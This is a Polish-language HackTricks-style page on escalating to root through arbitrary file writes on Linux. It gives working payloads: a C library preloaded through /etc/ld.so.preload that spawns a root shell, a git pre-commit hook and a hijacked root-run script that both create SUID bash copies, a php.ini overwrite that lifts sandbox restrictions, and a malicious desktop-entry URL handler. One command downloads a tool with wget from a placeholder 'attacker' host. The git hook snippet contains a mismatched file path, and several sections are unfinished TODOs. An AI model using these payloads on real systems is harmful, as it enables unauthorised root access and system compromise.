# Dowolny zapis pliku jako root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik zachowuje się jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa także w **SUID binaries**.\
Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która zostanie załadowana** przy każdym uruchamianym pliku binarnym.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **wykonywane** przy różnych **zdarzeniach** w repozytorium git, np. gdy tworzony jest commit, merge... Jeśli więc **uprzywilejowany skrypt lub użytkownik** wykonuje te czynności często i możliwe jest **zapisanie w folderze `.git`**, można to wykorzystać do **privesc**.

Na przykład, możliwe jest **wygenerowanie skryptu** w repo git w **`.git/hooks`**, tak aby był zawsze wykonywany przy utworzeniu nowego commita:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Pliki Cron i Time files

TODO

### Pliki usług i socketów

TODO

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany sandbox PHP

Niektóre niestandardowe daemony weryfikują dostarczony przez użytkownika kod PHP, uruchamiając `php` z **ograniczonym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod w sandboxie nadal dysponuje **jakimkolwiek mechanizmem zapisu** (np. `file_put_contents`) i możesz dostać się do **dokładnej ścieżki `php.ini`** używanej przez daemon, możesz **nadpisać tę konfigurację**, aby usunąć ograniczenia, a następnie przesłać drugi payload, który zostanie wykonany z podwyższonymi uprawnieniami.

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxu.
2. Drugi payload wykonuje kod, ponieważ niebezpieczne funkcje zostały ponownie włączone.

Minimalny przykład (zastąp ścieżkę używaną przez daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który binarny program powinien wykonywać jaki typ plików. TODO: sprawdzić wymagania do nadużycia tego w celu uruchomienia rev shell, gdy powszechny typ pliku jest otwarty.

### Overwrite schema handlers (like http: or https:)

Atakujący mający uprawnienia zapisu do katalogów konfiguracyjnych ofiary może w prosty sposób zastąpić lub utworzyć pliki zmieniające zachowanie systemu, co skutkuje niezamierzonym wykonaniem kodu. Modyfikując plik `$HOME/.config/mimeapps.list`, aby handlery URL dla HTTP i HTTPS wskazywały na złośliwy plik (np. ustawiając `x-scheme-handler/http=evil.desktop`), atakujący zapewnia, że **kliknięcie dowolnego linku http lub https wywoła kod określony w tym pliku `evil.desktop`**. Na przykład, po umieszczeniu poniższego złośliwego kodu w `evil.desktop` w `$HOME/.local/share/applications`, każde kliknięcie zewnętrznego URL uruchomi osadzoną komendę:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Więcej informacji znajdziesz w [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), gdzie zostało użyte do wykorzystania rzeczywistej luki.

### Root uruchamiający user-writable scripts/binaries

Jeśli uprzywilejowany workflow uruchamia coś takiego jak `/bin/sh /home/username/.../script` (lub dowolny binary wewnątrz katalogu należącego do nieuprzywilejowanego użytkownika), możesz go przejąć:

- **Wykryj wykonanie:** monitoruj procesy za pomocą [pspy](https://github.com/DominicBreuker/pspy), aby wykryć, że root wywołuje ścieżki kontrolowane przez użytkownika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potwierdź możliwość zapisu:** upewnij się, że zarówno docelowy plik, jak i jego katalog należą do twojego użytkownika i są przez niego zapisywalne.
- **Hijack the target:** zrób kopię zapasową oryginalnego binary/script i wrzuć payload, który tworzy SUID shell (lub dowolne inne działanie jako root), a następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Wyzwól uprzywilejowaną akcję** (np. naciśnięcie przycisku UI, który uruchamia helpera). Kiedy root ponownie wykona przechwyconą ścieżkę, złap eskalowany shell za pomocą `./rootshell -p`.

## Źródła

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
